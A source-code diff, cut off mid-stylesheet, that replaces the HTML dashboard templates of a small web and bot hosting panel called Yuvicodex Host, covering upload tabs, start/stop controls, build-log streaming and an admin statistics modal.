-.status-uploaded{background:rgba(255,170,0,0.15);color:#ffaa00;border:1px solid rgba(255,170,0,0.2)}
-.status-failed{background:rgba(255,0,0,0.15);color:#ff0000;border:1px solid rgba(255,0,0,0.2)}
-.card-meta{color:#666;font-size:0.8rem;margin:8px 0}
-.visit-link{display:inline-block;padding:8px 20px;border-radius:50px;background:#00e5ff;color:#000;text-decoration:none;font-weight:700;font-size:0.9rem;transition:.3s;margin:10px 0}
-.visit-link:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(0,229,255,0.3)}
-.actions{display:flex;flex-wrap:wrap;gap:8px;margin-top:15px}
-.actions button{padding:6px 14px;border:none;border-radius:12px;font-size:0.8rem;font-weight:600;cursor:pointer;transition:.2s}
-.actions button:hover{transform:scale(1.05)}
-.btn-start{background:rgba(0,229,255,0.2);color:#00e5ff}
-.btn-start:hover{background:#00e5ff;color:#000}
-.btn-stop{background:rgba(255,71,87,0.2);color:#ff4757}
-.btn-stop:hover{background:#ff4757;color:#fff}
-.btn-restart{background:rgba(255,170,0,0.2);color:#ffaa00}
-.btn-restart:hover{background:#ffaa00;color:#000}
-.btn-manage{background:rgba(255,255,255,0.08);color:#aaa}
-.btn-manage:hover{background:rgba(255,255,255,0.15);color:#fff}
-.btn-delete{background:rgba(255,0,0,0.15);color:#ff4444}
-.btn-delete:hover{background:#ff0000;color:#fff}
-.btn-edit{background:rgba(77,136,255,0.2);color:#4d88ff}
-.btn-edit:hover{background:#4d88ff;color:#fff}
-.btn-download{background:rgba(46,204,113,0.2);color:#2ecc71}
-.btn-download:hover{background:#2ecc71;color:#fff}
-.btn-openbot{background:rgba(29,161,242,0.2);color:#1da1f2}
-.btn-openbot:hover{background:#1da1f2;color:#fff}
-.name-edit{display:flex;gap:8px;margin-top:12px}
-.name-edit input{flex:1;padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;outline:none;font-size:0.85rem}
-.name-edit input:focus{border-color:#00e5ff}
-.name-edit button{padding:8px 16px;background:#00e5ff;border:none;border-radius:12px;color:#000;font-weight:600;cursor:pointer}
-.console{background:#0d0d0d;border-radius:12px;padding:15px;max-height:200px;overflow-y:auto;font-family:monospace;font-size:13px;color:#0f0;border:1px solid rgba(255,255,255,0.05);margin-top:15px}
-.log-container{display:none;margin:20px 0;background:#0d0d0d;border-radius:15px;padding:15px;border:1px solid rgba(255,255,255,0.1);max-height:400px;overflow-y:auto;font-family:'Courier New',monospace;font-size:13px;color:#aab}
-.log-container .line{margin:0;white-space:pre-wrap}
-.log-container .line.SYSTEM{color:#00e5ff}
-.log-container .line.SUCCESS{color:#00ff88}
-.log-container .line.ERROR{color:#ff4757}
-.log-container .line.PROCESS{color:#9ca3af}
-@media(max-width:600px){.header{flex-direction:column;gap:10px;text-align:center}.grid{grid-template-columns:1fr}}
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.7);z-index:9999;justify-content:center;align-items:center}
-.modal-overlay.open{display:flex}
-.modal{background:#0c1018;border:1px solid rgba(255,255,255,0.1);border-radius:25px;padding:30px;max-width:800px;width:90%;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,0.8);position:relative}
-.modal-close{position:absolute;top:15px;right:20px;background:none;border:none;color:#ff4757;font-size:28px;cursor:pointer}
-.modal h2{color:#00e5ff;margin-bottom:20px}
-.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:15px}
-.stat-card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:15px;padding:15px;text-align:center}
-.stat-card .label{color:#888;font-size:0.8rem;text-transform:uppercase;letter-spacing:1px}
-.stat-card .value{font-size:1.6rem;font-weight:bold;color:#00e5ff;margin:5px 0}
-.stat-card .sub{color:#666;font-size:0.8rem}
-.stat-card .progress-bar{width:100%;height:6px;background:#1a1a1a;border-radius:4px;margin-top:8px;overflow:hidden}
-.stat-card .progress-bar .fill{height:100%;background:linear-gradient(90deg,#7a00ff,#00e5ff);border-radius:4px;transition:width 0.5s}
-@media(max-width:600px){.stats-grid{grid-template-columns:1fr}}
-</style>
-</head>
-<body>
-<div class="container">
-<div class="header">
-<h1>🚀 Yuvicodex Host</h1>
-<div class="user-badge">
-<span class="badge">{{ user }}</span>
-<span class="plan-badge">{{ plan.upper() }}</span>
-{% if role == 'admin' %}
-<button class="stats-btn" id="statsBtn">⚙️ System Stats</button>
-{% endif %}
-<a href="/logout" class="btn-logout">Logout</a>
-</div>
-</div>
-
-<div class="tabs">
-<button class="tab-btn active" data-tab="websites">🌐 Websites</button>
-<button class="tab-btn" data-tab="bots">🤖 Bots</button>
-</div>
-
-<!-- WEBSITES TAB -->
-<div id="tab-websites" class="tab-content active">
-<div class="upload-box" id="dropZoneWebsite">
-<h3>📤 Upload Website (ZIP or individual files)</h3>
-<p style="color:#889;font-size:0.9rem;margin-bottom:10px;">Drag & drop or click to select</p>
-<input type="file" id="websiteFileInput" multiple accept=".zip,.py,.txt,.html,.js,.css,application/zip">
-<button class="btn" id="websiteUploadBtn" style="margin-top:10px;">Upload & Deploy</button>
-<div id="websiteUploadStatus"></div>
-</div>
-<div id="websiteGrid" class="grid">
-{% for w in websites %}
-<div class="card" data-id="{{ w.id }}">
-<div class="card-title">{{ w.website_name or w.website_slug }}</div>
-<div class="card-slug">🔗 {{ base_url }}/<strong>{{ w.website_slug }}</strong>/</div>
-<div class="card-port">Port: {{ w.allocated_port or 'Not allocated' }}</div>
-<div class="status-badge status-{{ w.status }}">{{ w.status.upper() }}</div>
-<div class="card-meta">Created: {{ w.created_at[:10] }} | Size: {{ (w.storage_used or 0)//1024 }} KB</div>
-{% if w.status == 'running' %}
-<a href="{{ base_url }}/{{ w.website_slug }}/" target="_blank" class="visit-link">🌐 Visit Site</a>
-{% endif %}
-<div class="actions">
-<button class="btn-start" onclick="action({{ w.id }},'start')">▶ Start</button>
-<button class="btn-stop" onclick="action({{ w.id }},'stop')">■ Stop</button>
-<button class="btn-restart" onclick="action({{ w.id }},'restart')">⟳ Restart</button>
-<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/files'">📁 Files</button>
-<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/logs'">📜 Logs</button>
-<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/deployments'">📋 Deployments</button>
-<button class="btn-manage" onclick="location.href='/website/{{ w.id }}/build'">🖥 Build Logs</button>
-<button class="btn-delete" onclick="if(confirm('Delete this website?')) action({{ w.id }},'delete')">🗑 Delete</button>
-</div>
-<div class="name-edit">
-<input type="text" id="name_input_{{ w.id }}" value="{{ w.website_name or '' }}" placeholder="Website Name">
-<button onclick="renameWebsite({{ w.id }})">Rename</button>
-</div>
-</div>
-{% else %}
-<div class="empty-msg" style="grid-column:1/-1;text-align:center;color:#555;padding:40px;">No websites uploaded yet.</div>
-{% endfor %}
-</div>
-<div class="log-container" id="websiteLogContainer"><div id="websiteLogContent"></div></div>
-</div>
-
-<!-- BOTS TAB -->
-<div id="tab-bots" class="tab-content">
-<div class="upload-box" id="dropZoneBot">
-<h3>🤖 Upload Bot (ZIP or individual files)</h3>
-<p style="color:#889;font-size:0.9rem;margin-bottom:10px;">Drag & drop or click to select</p>
-<input type="file" id="botFileInput" multiple accept=".zip,.py,.js,.go,.rb,.php,.sh,.pl">
-<button class="btn" id="botUploadBtn" style="margin-top:10px;">Upload & Deploy</button>
-<div id="botUploadStatus"></div>
-</div>
-<div id="botGrid" class="grid">
-{% for b in bots %}
-<div class="card" data-id="{{ b.id }}">
-<div class="card-title">{{ b.website_name or b.startup_file or 'Bot' }}</div>
-<div class="card-slug">🔗 Slug: {{ b.website_slug }}</div>
-<div class="card-port">PID: {{ b.pid or '—' }}</div>
-<div class="status-badge status-{{ b.status }}">{{ b.status.upper() }}</div>
-<div class="card-meta">Created: {{ b.created_at[:10] }} | Runtime: {{ (b.total_runtime_seconds or 0)//3600 }}h</div>
-<div class="actions">
-<button class="btn-start" onclick="action({{ b.id }},'start')">▶ Start</button>
-<button class="btn-stop" onclick="action({{ b.id }},'stop')">■ Stop</button>
-<button class="btn-restart" onclick="action({{ b.id }},'restart')">⟳ Restart</button>
-<button class="btn-edit" onclick="editBot({{ b.id }})">✎ Edit</button>
-<button class="btn-download" onclick="downloadBot({{ b.id }})">⬇ Download</button>
-<button class="btn-manage" onclick="location.href='/website/{{ b.id }}/logs'">📜 Logs</button>
-<button class="btn-manage" onclick="location.href='/website/{{ b.id }}/build'">🖥 Build Logs</button>
-<button class="btn-delete" onclick="if(confirm('Delete this bot?')) action({{ b.id }},'delete')">🗑 Delete</button>
-</div>
-<div class="name-edit">
-<input type="text" id="name_input_{{ b.id }}" value="{{ b.website_name or '' }}" placeholder="Bot Name">
-<button onclick="renameWebsite({{ b.id }})">Rename</button>
-</div>
-</div>
-{% else %}
-<div class="empty-msg" style="grid-column:1/-1;text-align:center;color:#555;padding:40px;">No bots uploaded yet.</div>
-{% endfor %}
-</div>
-<div class="console" id="botConsole">Select a bot to see logs.</div>
-</div>
-
-</div>
-
-<!-- Stats Modal -->
-<div class="modal-overlay" id="statsModal">
-<div class="modal">
-<button class="modal-close" id="statsModalClose">&times;</button>
-<h2>📊 System Statistics (Owner)</h2>
-<div class="stats-grid" id="statsGrid">
-<div class="stat-card"><div class="label">Total Hours Used (All)</div><div class="value" id="statTotalHours">--</div><div class="sub">Offset + Running</div></div>
-<div class="stat-card"><div class="label">Main Container Uptime</div><div class="value" id="statMainHours">--</div><div class="sub">Flask App</div></div>
-<div class="stat-card"><div class="label">Internal Sites/Bots</div><div class="value" id="statInternalHours">--</div><div class="sub">Subprocesses</div></div>
-<div class="stat-card"><div class="label">Render External Services</div><div class="value" id="statRenderHours">--</div><div class="sub">Active: <span id="statRenderActive">--</span></div></div>
-<div class="stat-card"><div class="label">Storage (Uploads)</div><div class="value" id="statStorage">--</div><div class="sub">Free: <span id="statDiskFree">--</span> GB</div></div>
-<div class="stat-card"><div class="label">Container RAM</div><div class="value" id="statRam">--</div><div class="sub"><span id="statRamUsed">--</span> MB / <span id="statRamTotal">--</span> MB</div><div class="progress-bar"><div class="fill" id="ramFill" style="width:0%;"></div></div></div>
-<div class="stat-card"><div class="label">CPU Usage</div><div class="value" id="statCpu">--</div><div class="sub">Percent</div></div>
-</div>
-<div style="margin-top:15px;border-top:1px solid rgba(255,255,255,0.1);padding-top:15px;">
-<label style="color:#aaa;">🔧 Set Offset (Total Hours from Render Dashboard)</label>
-<div style="display:flex;gap:10px;margin-top:5px;">
-<input type="number" id="offsetInput" step="0.01" placeholder="e.g. 52.30" style="flex:1;background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:10px;color:#fff;">
-<button id="setOffsetBtn" style="background:#00e5ff;border:none;border-radius:8px;padding:10px 20px;color:#000;font-weight:700;cursor:pointer;">SET OFFSET</button>
-</div>
-<div style="font-size:0.75rem;color:#666;margin-top:5px;">Render Dashboard → Usage → Total Hours Used so far.</div>
-</div>
-</div>
-</div>
-
-<script>
-// Tab switching
-document.querySelectorAll('.tab-btn').forEach(btn => {
-    btn.addEventListener('click', function() {
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        this.classList.add('active');
-        document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-        document.getElementById('tab-' + this.dataset.tab).classList.add('active');
-        if (this.dataset.tab === 'websites') { /* nothing extra */ }
-        else if (this.dataset.tab === 'bots') { /* nothing */ }
-    });
-});
-
-// Drag and Drop for Websites
-const dropZoneW = document.getElementById('dropZoneWebsite');
-dropZoneW.addEventListener('dragover', (e) => { e.preventDefault(); dropZoneW.classList.add('dragover'); });
-dropZoneW.addEventListener('dragleave', () => dropZoneW.classList.remove('dragover'));
-dropZoneW.addEventListener('drop', (e) => {
-    e.preventDefault(); dropZoneW.classList.remove('dragover');
-    const input = document.getElementById('websiteFileInput');
-    const dt = new DataTransfer();
-    for (let f of e.dataTransfer.files) dt.items.add(f);
-    input.files = dt.files;
-});
-
-// Drag and Drop for Bots
-const dropZoneB = document.getElementById('dropZoneBot');
-dropZoneB.addEventListener('dragover', (e) => { e.preventDefault(); dropZoneB.classList.add('dragover'); });
-dropZoneB.addEventListener('dragleave', () => dropZoneB.classList.remove('dragover'));
-dropZoneB.addEventListener('drop', (e) => {
-    e.preventDefault(); dropZoneB.classList.remove('dragover');
-    const input = document.getElementById('botFileInput');
-    const dt = new DataTransfer();
-    for (let f of e.dataTransfer.files) dt.items.add(f);
-    input.files = dt.files;
-});
-
-function escapeHtml(s) {
-    const d = document.createElement('div');
-    d.textContent = s; return d.innerHTML;
-}
-
-function formatUptime(sec) {
-    if (!sec || sec < 0) return '--';
-    const d = Math.floor(sec / 86400);
-    const h = Math.floor((sec % 86400) / 3600);
-    const m = Math.floor((sec % 3600) / 60);
-    const s = Math.floor(sec % 60);
-    return `${d}d ${h}h ${m}m ${s}s`;
-}
-
-// Actions for website/bot
-function action(id, type) {
-    if (!confirm('Are you sure?')) return;
-    fetch('/api/website/' + id + '/' + type, { method: 'POST' })
-    .then(r => r.json())
-    .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); })
-    .catch(() => alert('Network error'));
-}
-
-function renameWebsite(id) {
-    const val = document.getElementById('name_input_' + id).value.trim();
-    if (!val) return alert('Enter a name');
-    fetch('/api/website/' + id + '/rename', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: 'name=' + encodeURIComponent(val)
-    })
-    .then(r => r.json())
-    .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); });
-}
-
-function downloadBot(id) {
-    window.open('/api/website/' + id + '/download', '_blank');
-}
-
-function editBot(id) {
-    fetch('/api/website/' + id + '/content')
-    .then(r => r.json())
-    .then(data => {
-        const content = data.content || '';
-        const newContent = prompt('Edit file content:', content);
-        if (newContent !== null) {
-            fetch('/api/website/' + id + '/content', {
-                method: 'PUT',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: newContent })
-            })
-            .then(r => r.json())
-            .then(d => { if (d.success) location.reload(); else alert('Error: ' + d.error); });
-        }
-    });
-}
-
-// Upload Website
-document.getElementById('websiteUploadBtn').onclick = function() {
-    const files = document.getElementById('websiteFileInput').files;
-    if (!files.length) return alert('Select files');
-    const fd = new FormData();
-    for (let f of files) fd.append('files[]', f);
-    fd.append('type', 'website');
-    const st = document.getElementById('websiteUploadStatus');
-    st.innerHTML = '⏳ Uploading...';
-    fetch('/upload', { method: 'POST', body: fd })
-    .then(r => r.json())
-    .then(d => {
-        if (d.success) { st.innerHTML = '✅ Uploaded!'; showBuildLogs(d.website_id, 'website'); }
-        else st.innerHTML = '❌ ' + d.error;
-    })
-    .catch(() => st.innerHTML = '❌ Network error');
-};
-
-// Upload Bot
-document.getElementById('botUploadBtn').onclick = function() {
-    const files = document.getElementById('botFileInput').files;
-    if (!files.length) return alert('Select files');
-    const fd = new FormData();
-    for (let f of files) fd.append('files[]', f);
-    fd.append('type', 'bot');
-    const st = document.getElementById('botUploadStatus');
-    st.innerHTML = '⏳ Uploading...';
-    fetch('/upload', { method: 'POST', body: fd })
-    .then(r => r.json())
-    .then(d => {
-        if (d.success) { st.innerHTML = '✅ Uploaded!'; showBuildLogs(d.website_id, 'bot'); }
-        else st.innerHTML = '❌ ' + d.error;
-    })
-    .catch(() => st.innerHTML = '❌ Network error');
-};
-
-// Build Logs
-let currentLogSource = null;
-function showBuildLogs(websiteId, type) {
-    const containerId = (type === 'website') ? 'websiteLogContainer' : 'botLogContainer';
-    const container = document.getElementById(containerId);
-    if (!container) return;
-    container.style.display = 'block';
-    container.innerHTML = '<div id="logContent"></div>';
-    const logContent = document.getElementById('logContent');
-    if (currentLogSource) currentLogSource.close();
-    const evt = new EventSource('/deploy/' + websiteId + '/logs');
-    currentLogSource = evt;
-    evt.onmessage = function(e) {
-        const data = e.data;
-        if (data === '[REFRESH]') { location.reload(); return; }
-        const line = document.createElement('div');
-        line.className = 'line';
-        const match = data.match(/^\[(\d{2}:\d{2}:\d{2})\] \[([A-Z]+)\] (.*)$/);
-        if (match) {
-            const [, ts, step, msg] = match;
-            line.innerHTML = `<span style="color:#666">[${ts}]</span> <span style="color:#888">[${step}]</span> ${msg}`;
-            line.classList.add(step);
-        } else {
-            line.textContent = data;
-        }
-        logContent.appendChild(line);
-        container.scrollTop = container.scrollHeight;
-        if (data.includes('Deployment completed with status:')) {
-            setTimeout(() => { location.reload(); }, 2000);
-        }
-    };
-    evt.onerror = function() {};
-}
-
-// Stats Modal
-{% if role == 'admin' %}
-const statsBtn = document.getElementById('statsBtn');
-const statsModal = document.getElementById('statsModal');
-const statsModalClose = document.getElementById('statsModalClose');
-let statsInterval = null;
-
-statsBtn.onclick = function() {
-    statsModal.classList.add('open');
-    fetchStats();
-    if (statsInterval) clearInterval(statsInterval);
-    statsInterval = setInterval(fetchStats, 5000);
-};
-statsModalClose.onclick = function() { statsModal.classList.remove('open'); if (statsInterval) clearInterval(statsInterval); };
-statsModal.onclick = function(e) { if (e.target === this) { statsModal.classList.remove('open'); if (statsInterval) clearInterval(statsInterval); } };
-
-function fetchStats() {
-    fetch('/api/stats')
-    .then(r => r.json())
-    .then(data => {
-        document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
-        document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
-        document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
-        document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
-        document.getElementById('statRenderActive').textContent = data.render_active_count;
-        document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
-        document.getElementById('statDiskFree').textContent = data.disk_free_gb;
-        document.getElementById('statRam').textContent = data.ram.percent + '%';
-        document.getElementById('statRamUsed').textContent = data.ram.used_mb;
-        document.getElementById('statRamTotal').textContent = data.ram.total_mb;
-        document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
-        document.getElementById('statCpu').textContent = data.cpu_percent + '%';
-    });
-}
-
-document.getElementById('setOffsetBtn').onclick = function() {
-    const val = parseFloat(document.getElementById('offsetInput').value);
-    if (isNaN(val)) return alert('Enter valid number');
-    fetch('/api/set_offset', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ offset: val })
-    })
-    .then(r => r.json())
-    .then(d => {
-        if (d.success) { alert('Offset set to ' + val + ' hrs'); fetchStats(); }
-        else alert('Error: ' + d.error);
-    });
-};
-{% endif %}
-</script>
-</body>
-</html>
-"""
-
-# ---------- OTHER TEMPLATES (simple) ----------
 FILES_TEMPLATE = """
 <!DOCTYPE html>
 <html><head><title>Files</title>
@@ -2148,7 +2169,6 @@ function uploadFile(id){const f=document.getElementById('fileUpload').files;if(!
 function deleteFile(id,p){if(!confirm('Delete?'))return;fetch('/website/'+id+'/file/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:p})}).then(()=>location.reload())}
 </script></body></html>
 """
-
 EDIT_TEMPLATE = """
 <!DOCTYPE html>
 <html><head><title>Edit</title>
@@ -2156,17 +2176,3295 @@ EDIT_TEMPLATE = """
 </head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
 """
 
-LOGS_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Logs</title>
-<style>body{background:#0a0e1a;color:#fff;font-family:system-ui;padding:20px}.container{max-width:1000px;margin:auto}.tabs{display:flex;gap:10px;margin:15px 0}.tab{background:rgba(255,255,255,0.05);padding:8px 18px;border-radius:50px;cursor:pointer}.tab.active{background:rgba(0,229,255,0.2);color:#00e5ff}.tab-content{display:none}.tab-content.active{display:block}pre{background:rgba(0,0,0,0.4);padding:15px;border-radius:15px;max-height:400px;overflow-y:auto;font-family:monospace;color:#aab}</style>
-</head><body><div class="container"><a href="/dashboard">← Dashboard</a><h2>{{ website.website_name }}</h2>
-<div class="tabs"><div class="tab active" data-target="deploy">Deploy</div><div class="tab" data-target="runtime">Runtime</div><div class="tab" data-target="error">Errors</div></div>
-<div id="deploy" class="tab-content active"><pre>{{ deploy_log }}</pre></div>
-<div id="runtime" class="tab-content"><pre>{{ file_log }}</pre></div>
-<div id="error" class="tab-content"><pre>{{ error_log_text }}</pre></div>
-<script>document.querySelectorAll('.tab').forEach(t=>t.onclick=function(){document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));document.getElementById(this.dataset.target).classList.add('active');});</script></body></html>
+# ---------- MAIN HTML TEMPLATE (modified to include tabs, websites, stats) ----------
+HTML_TEMPLATE = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>{{ website_name }} · Admin Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        /* ---------- RESET & BASE ---------- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background: #05070d;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .view {
+            display: none;
+            width: 100%;
+            max-width: 420px;
+            margin: 0 auto;
+        }
+        .view.active {
+            display: block;
+        }
+
+        /* ---------- LOGIN CARD ---------- */
+        .login-card {
+            position: relative;
+            width: 100%;
+            padding: 30px 20px;
+            background: #0c1018;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0, 0, 0, .5);
+        }
+        .login-card::before {
+            content: "";
+            position: absolute;
+            inset: -3px;
+            background: conic-gradient(#00e5ff, transparent, transparent, transparent, #00e5ff);
+            animation: spin 4s linear infinite;
+        }
+        .login-card::after {
+            content: "";
+            position: absolute;
+            inset: 3px;
+            background: #0c1018;
+            border-radius: 22px;
+        }
+        .login-content {
+            position: relative;
+            z-index: 2;
+        }
+        .login-icon {
+            width: 110px;
+            height: 110px;
+            margin: auto;
+            border: 3px solid #00e5ff;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 45px;
+            color: #00e5ff;
+            box-shadow: 0 0 20px #00e5ff;
+            overflow: hidden;
+            background: #0c1018;
+            cursor: pointer;
+            transition: transform 0.1s;
+            user-select: none;
+        }
+        .login-icon:active {
+            transform: scale(0.95);
+        }
+        .login-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+        .login-title {
+            margin: 25px 0;
+            text-align: center;
+            color: #cfffff;
+            letter-spacing: 4px;
+            font-size: 1.3rem;
+        }
+        .login-card select,
+        .login-card input {
+            width: 100%;
+            margin: 12px 0;
+            padding: 16px;
+            background: #161b25;
+            border: 1px solid #2b3240;
+            border-radius: 15px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        .login-card select option {
+            background: #161b25;
+        }
+        .login-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 16px;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            background: linear-gradient(90deg, #7a00ff, #00d9ff);
+            transition: opacity 0.2s;
+        }
+        .login-btn:hover {
+            opacity: .9;
+        }
+        .login-error {
+            color: #ff4d4d;
+            text-align: center;
+            font-size: 14px;
+            margin-top: 10px;
+            min-height: 22px;
+        }
+        @keyframes spin {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ---------- USER DASHBOARD ---------- */
+        .user-container {
+            max-width: 400px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        .user-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .user-title {
+            letter-spacing: 3px;
+            font-weight: 800;
+            font-size: 1.2rem;
+        }
+        .hamburger {
+            font-size: 28px;
+            cursor: pointer;
+            color: #fff;
+            padding: 4px 8px;
+            border-radius: 8px;
+            transition: background 0.2s;
+            user-select: none;
+        }
+        .hamburger:hover {
+            background: rgba(255, 255, 255, 0.08);
+        }
+        .power-btn {
+            color: #ff4d4d;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        .user-header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 10px;
+        }
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: #888;
+            font-size: 1rem;
+            font-weight: 700;
+            padding: 8px 16px;
+            cursor: pointer;
+            transition: .3s;
+            border-radius: 10px;
+        }
+        .tab-btn:hover {
+            color: #fff;
+            background: rgba(255,255,255,0.05);
+        }
+        .tab-btn.active {
+            color: #00e5ff;
+            background: rgba(0,229,255,0.1);
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Upload Cards */
+        .upload-card {
+            border: 1px dashed #00e5ff;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            background: rgba(0, 229, 255, 0.05);
+            position: relative;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .upload-card .settings-icon {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            border: 1px solid #00e5ff;
+            padding: 5px 8px;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #00e5ff;
+            cursor: pointer;
+        }
+        .cloud-icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+            color: #00e5ff;
+        }
+        .upload-card>div:nth-child(3) {
+            color: #aaa;
+            font-size: 14px;
+        }
+        .deploy-btn {
+            background: #fff;
+            color: #000;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 900;
+            margin-top: 15px;
+            text-transform: uppercase;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            font-size: 14px;
+        }
+        #fileCountDisplay {
+            font-size: 12px;
+            color: #888;
+            margin-top: 8px;
+        }
+
+        /* Bot Cards (similar to original) */
+        #botListContainer {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        .bot-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 15px;
+            transition: border-color 0.2s;
+            cursor: pointer;
+        }
+        .bot-card:hover {
+            border-color: #555;
+        }
+        .bot-card.selected {
+            border-color: #00e5ff;
+        }
+        .bot-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .bot-name {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .bot-status {
+            font-size: 12px;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-weight: bold;
+        }
+        .bot-status.running {
+            background: #00ff6a33;
+            color: #00ff6a;
+            border: 1px solid #00ff6a;
+        }
+        .bot-status.stopped {
+            background: #555;
+            color: #aaa;
+            border: 1px solid #666;
+        }
+        .bot-uptime {
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 10px;
+            font-family: monospace;
+        }
+        .bot-owner {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 8px;
+        }
+        .bot-controls {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+        .bot-controls button {
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.2s, opacity 0.2s;
+        }
+        .bot-controls button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .btn-start {
+            background: #00d4ff;
+            color: #000;
+        }
+        .btn-stop {
+            background: #ff4d4d;
+            color: #fff;
+        }
+        .btn-edit {
+            background: #4d88ff;
+            color: #fff;
+        }
+        .btn-restart {
+            background: #ffaa00;
+            color: #000;
+        }
+        .btn-download {
+            background: #2ecc71;
+            color: #000;
+        }
+        .btn-delete {
+            background: #400;
+            color: #fff;
+        }
+        .btn-openbot {
+            background: #1da1f2;
+            color: #fff;
+            grid-column: span 2;
+            padding: 10px;
+            border-radius: 8px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn-openbot:hover {
+            background: #1a8cd8;
+        }
+        .btn-full {
+            grid-column: span 2;
+            background: #222;
+            color: #fff;
+            margin-top: 5px;
+        }
+        .btn-full.danger {
+            background: #400;
+        }
+
+        /* Website Cards */
+        .website-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 20px;
+        }
+        .website-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 15px;
+            padding: 15px;
+            transition: border-color 0.2s;
+        }
+        .website-card:hover {
+            border-color: #555;
+        }
+        .website-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .website-name {
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .website-slug {
+            color: #888;
+            font-size: 0.9rem;
+            margin: 3px 0;
+        }
+        .website-port {
+            color: #888;
+            font-size: 0.8rem;
+        }
+        .website-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            margin-top: 10px;
+        }
+        .website-actions button {
+            padding: 6px 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: .2s;
+        }
+        .website-actions button:hover {
+            transform: scale(1.05);
+        }
+        .btn-start-w {
